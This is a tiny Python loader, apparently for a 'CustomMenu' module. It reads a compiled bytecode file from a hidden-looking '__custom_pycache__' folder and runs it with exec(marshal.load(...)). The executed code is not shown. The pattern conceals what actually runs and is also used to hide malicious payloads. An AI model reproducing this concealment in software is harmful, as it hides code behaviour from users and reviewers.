
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'CustomMenu_c348e00e8ce347dca2d727b77c752a57.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
